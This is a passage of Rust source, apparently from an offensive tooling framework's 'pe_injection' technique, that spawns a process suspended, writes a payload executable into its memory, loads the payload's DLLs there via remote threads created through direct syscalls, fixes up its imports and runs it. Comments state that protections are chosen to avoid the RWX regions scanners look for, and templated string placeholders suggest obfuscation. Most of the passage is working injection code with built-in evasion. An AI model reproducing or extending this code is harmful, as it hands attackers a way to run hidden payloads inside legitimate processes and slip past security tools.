        // table would spill into the next slot.
        if pe.pe32plus {
            write_u64(image, offset, address)?;
        } else {
            write_u32(image, offset, address as u32)?;
        }
    }
    Ok(count)
}

// --- Target process ---

fn spawn_suspended(target: &str) -> Result<(HANDLE, HANDLE, u32), String> {
    // Token 0 of a Windows command line is the executable name, never an
    // argument: the payload's `argv[0]` is the target's file name, and the
    // payload args declared in the plan follow it (see the technique README).
    let exe_name = match target.rsplit(|c| c == '\\' || c == '/').next() {
        Some(name) if !name.is_empty() => name,
        _ => target,
    };
    let line = crate::build_command_line(exe_name);

    let mut app = target.as_bytes().to_vec();
    app.push(0);
    let mut cmd = line.into_bytes();
    cmd.push(0);

    let mut startup: STARTUPINFOA = unsafe { std::mem::zeroed() };
    startup.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    unsafe {
        CreateProcessA(
            PCSTR(app.as_ptr()),
            PSTR(cmd.as_mut_ptr()),
            None,
            None,
            BOOL(0),
            CREATE_SUSPENDED,
            None,
            PCSTR::null(),
            &startup,
            &mut pi,
        )
    }
    .map_err(|e| format!("{}: {e}", $MSG_CREATE_PROCESS_FAILED$))?;

    Ok((pi.hProcess, pi.hThread, pi.dwProcessId))
}

/// Resolves `LoadLibraryA`'s address in the current process.
///
/// System DLLs share one base per boot, so the address is also valid in the
/// target — whose loader has already mapped its own dependencies by the time
/// `CreateProcessA` returns, even suspended. The address becomes a remote
/// thread's start routine, which is ABI-compatible with
/// `LoadLibraryA(LPCSTR)`: one pointer argument in `rcx`, result in `rax`;
/// `nt_create_thread_ex` hands it the DLL-name pointer as its argument.
fn resolve_load_library() -> Result<usize, String> {
    let load_library: String = $LOAD_LIBRARY_DEF$;
    resolve_kernel32_export(load_library)
}

/// Resolves an export of the session-wide `kernel32.dll` in the current
/// process; the address is valid in the target too.
fn resolve_kernel32_export(name: String) -> Result<usize, String> {
    let kernel32: String = $KERNEL32_DEF$;
    let kernel32_c = std::ffi::CString::new(kernel32).map_err(|_| $MSG_BAD_KERNEL32_NAME$)?;
    let name_c = std::ffi::CString::new(name).map_err(|_| $MSG_BAD_EXPORT_NAME$)?;

    let module = unsafe { GetModuleHandleA(PCSTR(kernel32_c.as_ptr() as *const u8)) }
        .map_err(|_| $MSG_KERNEL32_NOT_FOUND$)?;
    let Some(proc) = (unsafe { GetProcAddress(module, PCSTR(name_c.as_ptr() as *const u8)) }) else {
        return Err($MSG_KERNEL32_EXPORT_NOT_FOUND$);
    };
    Ok(proc as usize)
}

/// Loads a DLL in the *current* process and returns the module, the one
/// `GetProcAddress` runs against (its base is the export RVA's origin).
fn load_module_here(name: &str) -> Result<HMODULE, String> {
    let name_c = std::ffi::CString::new(name).map_err(|_| $MSG_BAD_DLL_NAME$)?;
    unsafe { LoadLibraryA(PCSTR(name_c.as_ptr() as *const u8)) }
        .map_err(|_| $MSG_DLL_RELOAD_FAILED$)
}

/// Resolves an export in the loader's copy of a DLL, by name or (`#<n>`)
/// ordinal — the same spelling the shared resolver reports.
fn local_export(module: HMODULE, func: &str) -> Option<usize> {
    if let Some(ordinal) = func.strip_prefix('#') {
        if let Ok(ordinal) = ordinal.parse::<u16>() {
            return unsafe { GetProcAddress(module, PCSTR(ordinal as usize as *const u8)) }
                .map(|proc| proc as usize);
        }
        return None;
    }
    let name = std::ffi::CString::new(func).ok()?;
    unsafe { GetProcAddress(module, PCSTR(name.as_ptr() as *const u8)) }.map(|proc| proc as usize)
}

/// Enumerates the target's loaded modules.
///
/// `CreateToolhelp32Snapshot` reads the target's loader list — userland
/// enumeration, like `GetModuleHandleA`, not a syscall the stub issues.
fn target_modules(process_id: u32) -> Result<Vec<TargetModule>, String> {
    let snapshot = unsafe {
        CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, process_id)
    }
    .map_err(|_| $MSG_SNAPSHOT_FAILED$)?;

    let mut entry = MODULEENTRY32W::default();
    entry.dwSize = std::mem::size_of::<MODULEENTRY32W>() as u32;
    let mut modules = Vec::new();
    let mut more = unsafe { Module32FirstW(snapshot, &mut entry) }.is_ok();
    while more {
        modules.push(TargetModule {
            name: nul_terminated(&entry.szModule),
            base: entry.modBaseAddr as usize as u64,
            path: nul_terminated(&entry.szExePath),
        });
        more = unsafe { Module32NextW(snapshot, &mut entry) }.is_ok();
    }
    let _ = crate::nt_close(snapshot);
    Ok(modules)
}

/// Decodes a fixed-size, null-terminated UTF-16 buffer.
fn nul_terminated(buffer: &[u16]) -> String {
    let end = match buffer.iter().position(|&c| c == 0) {
        Some(end) => end,
        None => buffer.len(),
    };
    String::from_utf16_lossy(&buffer[..end])
}

/// Matches one remote `LoadLibraryA` result to a target module.
///
/// A thread's exit status carries only the low 32 bits of the returned
/// `HMODULE`; the snapshot supplies the rest. A status that is not 64 KB
/// aligned cannot be a module base, so it is a failure or an exception code;
/// the module name is the fallback for a base whose low half is zero or for an
/// API-set descriptor (`LoadLibraryA` returns the contract host, whose name
/// differs from the descriptor's).
fn target_base_of<'a>(
    name: &str,
    exit_status: i32,
    modules: &'a [TargetModule],
) -> Option<&'a TargetModule> {
    let low = exit_status as u32;
    if low & 0xFFFF != 0 {
        return None;
    }
    if low != 0 {
        if let Some(module) = modules.iter().find(|module| module.base as u32 == low) {
            return Some(module);
        }
    }
    modules
        .iter()
        .find(|module| module.name.eq_ignore_ascii_case(name))
}

/// Resolves an import to the address the *target* needs.
///
/// `GetProcAddress` may return an address in a different module than the one
/// it was asked about (`kernel32.dll` forwards exports to `kernelbase.dll` and
/// `ntdll.dll`, for example), so the containing module is identified first and
/// the RVA is taken relative to *its* base, then rebased onto the target's
/// mapping of the same module.
///
/// `None` when the containing module cannot be identified or is not mapped in
/// the target at all; the caller then falls back to the local address (the
/// resolver's resolution error, if any, stays accurate that way).
fn target_export(local: usize, target_modules: &[TargetModule]) -> Option<u64> {
    let mut module = HMODULE::default();
    unsafe {
        GetModuleHandleExW(
            GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
            PCWSTR(local as *const u16),
            &mut module,
        )
    }
    .ok()?;
    let containing_base = module.0 as usize as u64;
    let path = module_path_here(module).ok()?;
    let leaf = leaf_name(&path);
    let target = target_modules
        .iter()
        .find(|module| module.name.eq_ignore_ascii_case(leaf))?;
    Some(target.base.wrapping_add((local as u64).wrapping_sub(containing_base)))
}

/// The file name part of a path.
fn leaf_name(path: &str) -> &str {
    match path.rsplit(|c| c == '\\' || c == '/').next() {
        Some(leaf) => leaf,
        None => path,
    }
}

/// Returns the full path of a module mapped in the loader process, for the
/// same-file check against the target's copy.
fn module_path_here(module: HMODULE) -> Result<String, String> {
    let mut path = [0u16; 260];
    let length = unsafe { GetModuleFileNameW(module, &mut path) } as usize;
    if length == 0 {
        return Err($MSG_MODULE_PATH_FAILED$);
    }
    Ok(String::from_utf16_lossy(&path[..length.min(path.len())]))
}

/// Returns the (deduplicated) names of the DLLs the payload imports.
fn imported_dll_names(image: &[u8], pe: &Pe) -> Result<Vec<String>, String> {
    let mut names: Vec<String> = Vec::new();
    if pe.import_rva == 0 || pe.import_size == 0 {
        return Ok(names);
    }

    let mut desc = rva_to_offset(pe, pe.import_rva).ok_or_else(|| $MSG_IMPORT_DIR_UNMAPPED$)?;
    loop {
        let original_thunk = read_u32(image, desc)?;
        let name_rva = read_u32(image, desc + 12)?;
        let first_thunk = read_u32(image, desc + 16)?;
        if original_thunk == 0 && name_rva == 0 && first_thunk == 0 {
            break;
        }
        if name_rva != 0 {
            let name_off =
                rva_to_offset(pe, name_rva).ok_or_else(|| $MSG_DLL_NAME_UNMAPPED$)?;
            let end = image[name_off..]
                .iter()
                .position(|&b| b == 0)
                .ok_or_else(|| $MSG_DLL_NAME_UNTERMINATED$)?;
            let name = String::from_utf8_lossy(&image[name_off..name_off + end]).into_owned();
            if !names.contains(&name) {
                names.push(name);
            }
        }
        desc += 20;
    }
    Ok(names)
}

/// Loads every DLL the payload imports into the target and returns what the
/// IAT needs: the loader's module per descriptor and the target's module list.
///
/// Each name is written into the target and loaded with a remote thread that
/// calls `LoadLibraryA` there (`NtCreateThreadEx` through the syscall layer).
/// A thread's exit status is only 32 bits wide, so the proof that each load
/// succeeded — and the target's module list for the rebasing — comes from a
/// toolhelp snapshot of the target's loader list.
fn load_imports_in_target(
    process: HANDLE,
    process_id: u32,
    image: &[u8],
    pe: &Pe,
) -> Result<ImportResolution, String> {
    let names = imported_dll_names(image, pe)?;
    if names.is_empty() {
        return Ok(ImportResolution {
            modules: Vec::new(),
            target_modules: Vec::new(),
        });
    }

    let load_library = resolve_load_library()?;
    let mut loaded: Vec<(String, i32)> = Vec::with_capacity(names.len());

    for name in names {
        let mut name_bytes = name.clone().into_bytes();
        name_bytes.push(0);

        let mut address: *mut core::ffi::c_void = core::ptr::null_mut();
        let mut size = name_bytes.len();
        let status = crate::nt_alloc_vm(
            process,
            &mut address,
            0,
            &mut size,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 {
            return Err(nt_error($MSG_DLL_NAME_ALLOC_FAILED$, status));
        }

        let mut written = 0usize;
        let status = crate::nt_write_vm(
            process,
            address as *const core::ffi::c_void,
            name_bytes.as_ptr() as *const core::ffi::c_void,
            name_bytes.len(),
            &mut written,
        );
        if status < 0 {
            return Err(nt_error($MSG_DLL_NAME_WRITE_FAILED$, status));
        }

        let mut thread = HANDLE::default();
        let status =
            crate::nt_create_thread_ex(process, &mut thread, load_library, address as usize, 0);
        if status < 0 {
            return Err(nt_error(
                format!("{} '{name}'", $MSG_LOAD_DLL_FAILED$),
                status,
            ));
        }
        let status = crate::nt_wait_for_single_object(thread, u32::MAX);
        if status < 0 {
            let _ = crate::nt_close(thread);
            return Err(nt_error(
                format!("{} '{name}'", $MSG_DLL_LOAD_UNFINISHED$),
                status,
            ));
        }
        let info = thread_basic_information(thread);
        let _ = crate::nt_close(thread);
        let info = info?;
        loaded.push((name, info.exit_status));
    }

    // One snapshot covers every load; it is the only source of a full 64-bit
    // base and the proof that each load produced a mapped module.
    let target = target_modules(process_id)?;

    let mut modules = Vec::with_capacity(loaded.len());
    for (name, exit_status) in loaded {
        let Some(entry) = target_base_of(&name, exit_status, &target) else {
            return Err(format!("{} '{name}'", $MSG_DLL_NOT_MAPPED$));
        };
        let module = load_module_here(&name)?;
        // A same-named but different file (a Store app's private copy of the
        // VC runtime, for example) can map the exports at other RVAs, so the
        // rebasing below would be wrong. Refusing beats a silent crash.
        let here = module_path_here(module)?;
        if !here.eq_ignore_ascii_case(&entry.path) {
            return Err(format!("{name} ({} != {})", $MSG_DLL_FILE_MISMATCH$, entry.path));
        }
        crate::tech_dbg!("pe_injection", "'{name}' loaded in the target");
        modules.push((name, module));
    }

    Ok(ImportResolution {
        modules,
        target_modules: target,
    })
}

/// Writes the payload's headers and sections into the target.
fn write_image(process: HANDLE, base: u64, image: &[u8], pe: &Pe) -> Result<(), String> {
    let headers = image
        .get(..pe.size_of_headers as usize)
        .ok_or_else(|| $MSG_HEADERS_OOB$)?;
    write_remote(process, base, headers)?;

    for sec in &pe.sections {
        let start = sec.pointer_to_raw_data as usize;
        let end = start
            .checked_add(sec.size_of_raw_data as usize)
            .ok_or_else(|| $MSG_OFFSET_OVERFLOW$)?;
        let data = image
            .get(start..end)
            .ok_or_else(|| $MSG_SECTION_DATA_OOB$)?;
        write_remote(process, base + sec.virtual_address as u64, data)?;
    }
    Ok(())
}

fn write_remote(process: HANDLE, address: u64, data: &[u8]) -> Result<(), String> {
    if data.is_empty() {
        return Ok(());
    }
    let mut written = 0usize;
    let status = crate::nt_write_vm(
        process,
        address as *const core::ffi::c_void,
        data.as_ptr() as *const core::ffi::c_void,
        data.len(),
        &mut written,
    );
    if status < 0 {
        return Err(nt_error(
            format!(
                "{} {} bytes to 0x{address:x}",
                $MSG_WRITE_FAILED$,
                data.len()
            ),
            status,
        ));
    }
    Ok(())
}

/// Narrows each region to the protection its section needs, once the image is
/// in place: headers read-only, executable sections `PAGE_EXECUTE_READ`,
/// writable data `PAGE_READWRITE`. A section that asks for both execute and
/// write is given execute-read — a manually mapped image has no business with
/// the RWX region scanners look for.
fn protect_image(process: HANDLE, base: u64, pe: &Pe) -> Result<(), String> {
    protect_range(
        process,
        base,
        pe.size_of_headers,
        PAGE_READONLY.0,
        $MSG_HEADERS_PROTECT_FAILED$,
    )?;

    for sec in &pe.sections {
        let virtual_size = sec.virtual_size.max(sec.size_of_raw_data);
        let size = virtual_size.min(pe.size_of_image.saturating_sub(sec.virtual_address));
        if size == 0 {
            continue;
        }
        let protect = if sec.characteristics & IMAGE_SCN_MEM_EXECUTE != 0 {
            PAGE_EXECUTE_READ.0
        } else if sec.characteristics & IMAGE_SCN_MEM_WRITE != 0 {
            PAGE_READWRITE.0
        } else {
            PAGE_READONLY.0
        };
        protect_range(
            process,
            base + sec.virtual_address as u64,
            size,
            protect,
            format!(
                "{} 0x{:08x}",
                $MSG_SECTION_PROTECT_FAILED$,
                sec.virtual_address
            ),
        )?;
    }
    Ok(())
}

fn protect_range(
    process: HANDLE,
    address: u64,
    size: u32,
    protect: u32,
    label: String,
) -> Result<(), String> {
    if size == 0 {
        return Ok(());
    }
    let mut previous = 0u32;
    let status = crate::nt_protect_vm(
        process,
        address as *mut core::ffi::c_void,
        size as usize,
        protect,
        &mut previous,
    );
    if status < 0 {
        return Err(nt_error(label, status));
    }
    Ok(())
}

/// Waits for the payload to finish and relays its exit code.
///
/// A full PE executable's entry point calls `ExitProcess`, so the *process*
/// exit status is the payload's code — the value a chained step sees. A payload
/// whose entry point merely returns ends only its thread: the thread's exit
/// status (its return value) is relayed then, and the target keeps running with
/// its own thread still parked.
fn wait_and_exit(process: HANDLE, thread: HANDLE, timeout_ms: u32) -> Result<i32, String> {
    let wait_ms = if timeout_ms == 0 { u32::MAX } else { timeout_ms };
    let status = crate::nt_wait_for_single_object(thread, wait_ms);
    if status == STATUS_TIMEOUT {
        let _ = crate::nt_close(thread);
        let _ = crate::nt_close(process);
        return Err(nt_error($MSG_WAIT_TIMEOUT$, STATUS_TIMEOUT));
    }
    if status < 0 {
        let _ = crate::nt_close(thread);
        let _ = crate::nt_close(process);
        return Err(nt_error($MSG_WAIT_FAILED$, status));
    }

    // The thread is done. When the process exited with it, its exit code is the
    // payload's; the grace period covers the moment between the last thread
    // ending and the process object being signaled.
    let process_status = crate::nt_wait_for_single_object(process, PROCESS_EXIT_GRACE_MS);
    if process_status == 0 {
        let exit_code = query_process_exit(process);
        let _ = crate::nt_close(thread);
        let _ = crate::nt_close(process);
        let exit_code = exit_code?;
        crate::tech_dbg!("pe_injection", "target exited with code {exit_code}");
        return Ok(exit_code);
    }

    // The entry point returned without ending the process. Relay the thread's
    // return value; a negative one is an NTSTATUS from a fault, which is a
    // failure, not an exit code.
    let info = thread_basic_information(thread);
    let _ = crate::nt_close(thread);
    let _ = crate::nt_close(process);
    let info = info?;
    if info.exit_status < 0 {
        return Err(nt_error($MSG_THREAD_FAULTED$, info.exit_status));
    }
    crate::tech_dbg!("pe_injection", "payload returned {}", info.exit_status);
    Ok(info.exit_status)
}

/// Reads a process's exit status (what `GetExitCodeProcess` wraps) through the
/// syscall layer.
fn query_process_exit(process: HANDLE) -> Result<i32, String> {
    let mut info = ProcessBasicInformation::default();
    let mut returned = 0u32;
    let status = crate::nt_query_info_process(
        process,
        0, // ProcessBasicInformation
        &mut info as *mut ProcessBasicInformation as *mut core::ffi::c_void,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut returned,
    );
    if status < 0 {
        return Err(nt_error($MSG_EXIT_STATUS_FAILED$, status));
    }
    Ok(info.exit_status)
}

/// Reads a thread's `THREAD_BASIC_INFORMATION`: its exit status (a thread's
/// return value, once it has finished).
fn thread_basic_information(thread: HANDLE) -> Result<ThreadBasicInformation, String> {
    let mut info = ThreadBasicInformation::default();
    let mut returned = 0u32;
    let status = crate::nt_query_info_thread(
        thread,
        THREAD_BASIC_INFORMATION_CLASS,
        &mut info as *mut ThreadBasicInformation as *mut core::ffi::c_void,
        std::mem::size_of::<ThreadBasicInformation>() as u32,
        &mut returned,
    );
    if status < 0 {
        return Err(nt_error($MSG_TEB_READ_FAILED$, status));
    }
    Ok(info)
}

/// `THREAD_BASIC_INFORMATION` as the kernel lays it out: the TEB pointer is
/// pointer-sized and follows the exit status directly on x86, while x64 pads
/// the status to eight bytes. Only the exit status is read.
#[cfg(target_arch = "x86_64")]
#[repr(C)]
#[derive(Default)]
struct ThreadBasicInformation {
    exit_status: i32,
    _padding: i32,
    _teb_base_address: u64,
    _client_id: [u64; 2],
    _affinity_mask: u64,
    _priority: i32,
    _base_priority: i32,
}

/// `THREAD_BASIC_INFORMATION` on x86 (no padding around the exit status).
#[cfg(target_arch = "x86")]
#[repr(C)]
#[derive(Default)]
struct ThreadBasicInformation {
    exit_status: i32,
    _teb_base_address: u32,
    _client_id: [u32; 2],
    _affinity_mask: u32,
    _priority: i32,
    _base_priority: i32,
}

/// `PROCESS_BASIC_INFORMATION` as the kernel lays it out: only the first field
/// is read (the target's exit status); the rest keeps the layout right so the
/// kernel writes into a correctly sized buffer.
#[cfg(target_arch = "x86_64")]
#[repr(C)]
#[derive(Default)]
struct ProcessBasicInformation {
    exit_status: i32,
    _peb_base_address: u64,
    _affinity_mask: u64,
    _base_priority: i32,
    _padding: i32,
    _unique_process_id: u64,
    _parent_process_id: u64,
}

/// `PROCESS_BASIC_INFORMATION` on x86 (all fields 32-bit).
#[cfg(target_arch = "x86")]
#[repr(C)]
#[derive(Default)]
struct ProcessBasicInformation {
    exit_status: i32,
    _peb_base_address: u32,
    _affinity_mask: u32,
    _base_priority: i32,
    _unique_process_id: u32,
    _parent_process_id: u32,
}

// --- Bounds-checked little-endian reads/writes ---

fn read_u16(b: &[u8], off: usize) -> Result<u16, String> {
    let s = b
        .get(
            off..off
                .checked_add(2)
                .ok_or_else(|| $MSG_OFFSET_OVERFLOW$)?,
        )
        .ok_or_else(|| $MSG_READ_OOB$)?;
    Ok(u16::from_le_bytes([s[0], s[1]]))
}

fn read_u32(b: &[u8], off: usize) -> Result<u32, String> {
    let s = b
        .get(
            off..off
                .checked_add(4)
                .ok_or_else(|| $MSG_OFFSET_OVERFLOW$)?,
        )
        .ok_or_else(|| $MSG_READ_OOB$)?;
    Ok(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
}

fn read_u64(b: &[u8], off: usize) -> Result<u64, String> {
    let s = b
        .get(
            off..off
                .checked_add(8)
                .ok_or_else(|| $MSG_OFFSET_OVERFLOW$)?,
        )
        .ok_or_else(|| $MSG_READ_OOB$)?;
    Ok(u64::from_le_bytes([
        s[0], s[1], s[2], s[3], s[4], s[5], s[6], s[7],
    ]))
}

fn write_u32(b: &mut [u8], off: usize, v: u32) -> Result<(), String> {
    let s = b
        .get_mut(
            off..off
                .checked_add(4)
                .ok_or_else(|| $MSG_OFFSET_OVERFLOW$)?,
        )
        .ok_or_else(|| $MSG_WRITE_OOB$)?;
    s.copy_from_slice(&v.to_le_bytes());
    Ok(())
}

fn write_u64(b: &mut [u8], off: usize, v: u64) -> Result<(), String> {
    let s = b
        .get_mut(
            off..off
                .checked_add(8)
                .ok_or_else(|| $MSG_OFFSET_OVERFLOW$)?,
        )
        .ok_or_else(|| $MSG_WRITE_OOB$)?;
    s.copy_from_slice(&v.to_le_bytes());
    Ok(())
}
